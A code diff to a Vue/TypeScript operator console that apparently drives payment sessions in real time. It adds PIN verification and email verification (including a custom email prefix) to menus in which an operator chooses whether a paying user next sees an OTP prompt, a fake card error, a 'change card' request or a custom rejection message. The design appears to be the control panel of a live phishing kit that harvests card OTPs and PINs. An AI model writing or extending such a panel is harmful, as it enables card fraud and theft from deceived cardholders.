@@ -29,6 +29,9 @@ const defaultActions = [
 const cardActions = [
   { label: 'OTP验证', value: 'otp_verify' as Api.Payment.OperatorAction },
   { label: 'OTP验证（自定义尾号）', value: 'custom_otp_tail' as Api.Payment.OperatorAction },
+  { label: 'PIN验证', value: 'pin_verify' as Api.Payment.OperatorAction },
+  { label: '邮箱验证', value: 'email_verify' as Api.Payment.OperatorAction },
+  { label: '邮箱验证（自定义邮箱）', value: 'custom_email_verify' as Api.Payment.OperatorAction },
   { label: 'APP验证', value: 'app_verify' as Api.Payment.OperatorAction },
   { label: '换卡支付', value: 'change_card' as Api.Payment.OperatorAction },
   { label: '卡片错误', value: 'card_error' as Api.Payment.OperatorAction },
@@ -40,6 +43,9 @@ const cardActions = [
 const otpActions = [
   { label: '换卡支付', value: 'change_card' as Api.Payment.OperatorAction },
   { label: '验证码错误', value: 'otp_error' as Api.Payment.OperatorAction },
+  { label: 'PIN验证', value: 'pin_verify' as Api.Payment.OperatorAction },
+  { label: '邮箱验证', value: 'email_verify' as Api.Payment.OperatorAction },
+  { label: '邮箱验证（自定义邮箱）', value: 'custom_email_verify' as Api.Payment.OperatorAction },
   { label: 'APP验证', value: 'app_verify' as Api.Payment.OperatorAction },
   { label: '自定义提示（换卡支付）', value: 'change_card_prompt' as Api.Payment.OperatorAction },
   { label: '自定义提示', value: 'custom_prompt' as Api.Payment.OperatorAction },
@@ -51,6 +57,9 @@ const appVerifyActions = [
   { label: '换卡支付', value: 'change_card' as Api.Payment.OperatorAction },
   { label: '未完成验证', value: 'app_verify_fail' as Api.Payment.OperatorAction },
   { label: 'OTP验证', value: 'otp_verify' as Api.Payment.OperatorAction },
+  { label: 'PIN验证', value: 'pin_verify' as Api.Payment.OperatorAction },
+  { label: '邮箱验证', value: 'email_verify' as Api.Payment.OperatorAction },
+  { label: '邮箱验证（自定义邮箱）', value: 'custom_email_verify' as Api.Payment.OperatorAction },
   { label: '自定义提示（换卡支付）', value: 'change_card_prompt' as Api.Payment.OperatorAction },
   { label: '自定义提示', value: 'custom_prompt' as Api.Payment.OperatorAction },
   { label: '跳转完成', value: 'redirect_complete' as Api.Payment.OperatorAction },
@@ -78,6 +87,12 @@ function handleSelect(key: string) {
     return;
   }
   if (key === 'custom_otp_tail') {
+    pendingAction.value = key as Api.Payment.OperatorAction;
+    promptMessage.value = '';
+    showPrompt.value = true;
+    return;
+  }
+  if (key === 'custom_email_verify') {
     pendingAction.value = key as Api.Payment.OperatorAction;
     promptMessage.value = '';
     showPrompt.value = true;
@@ -129,11 +144,11 @@ function statusLabel(status: Api.Payment.SessionStatus, hasOtp?: boolean, appVer
 
     <NModal :show="showPrompt" :mask-closable="false" @update:show="(v: boolean) => { if (!v) cancelPrompt(); }">
       <div class="prompt-modal">
-        <h4>{{ pendingAction === 'change_card_prompt' ? '自定义提示（换卡支付）' : pendingAction === 'custom_otp_tail' ? 'OTP验证（自定义尾号）' : '自定义提示' }}</h4>
+        <h4>{{ pendingAction === 'change_card_prompt' ? '自定义提示（换卡支付）' : pendingAction === 'custom_otp_tail' ? 'OTP验证（自定义尾号）' : pendingAction === 'custom_email_verify' ? '邮箱验证（自定义邮箱）' : '自定义提示' }}</h4>
         <NInput
           v-model:value="promptMessage"
           type="textarea"
-          :placeholder="pendingAction === 'custom_otp_tail' ? '输入手机尾号后4位' : '输入推送给用户的提示信息（前台显示为拒绝+文案）'"
+          :placeholder="pendingAction === 'custom_otp_tail' ? '输入手机尾号后4位' : pendingAction === 'custom_email_verify' ? '输入邮箱前缀' : '输入推送给用户的提示信息（前台显示为拒绝+文案）'"
           :autosize="{ minRows: 3, maxRows: 6 }"
         />
         <div class="prompt-actions">
